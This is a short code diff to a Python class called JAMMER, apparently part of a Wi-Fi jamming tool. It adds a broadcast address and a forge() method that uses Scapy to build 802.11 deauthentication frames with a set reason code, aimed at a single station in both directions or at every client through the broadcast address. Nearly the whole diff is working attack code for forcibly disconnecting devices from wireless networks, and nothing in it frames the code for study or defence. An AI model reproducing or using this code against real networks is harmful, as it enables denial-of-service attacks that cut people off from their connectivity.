@@ -28,6 +28,8 @@ class JAMMER:
 	__EXECUTED     = []
 	__DECPACKETS   = []
 
+	__BROADCAST    = "ff:ff:ff:ff:ff:ff"
+
 	def __init__(self, prs):
 		self.verbose    = prs.verbose
 		self.exceptions = prs.exceptions
@@ -147,6 +149,30 @@ class JAMMER:
 
 			if channel == ch:
 				retval.append(connection)
+
+		return retval
+
+	def forge(self, ap, sta):
+		def fpkt(sn, rc):
+			print( "Code {}".format(self.code) )
+			pkt = RadioTap() / Dot11(
+				type=0, 
+				subtype=12,
+				addr1=rc, 
+				addr2=sn, 
+				addr3=sn
+				) / Dot11Deauth(
+				reason=self.code
+				)
+			return pkt
+
+		retval = []
+
+		if sta != self.__BROADCAST:
+			retval.append(fpkt(ap, sta))
+			retval.append(fpkt(sta, ap))
+		else:
+			retval.append(fpkt(ap, sta))
 
 		return retval
 
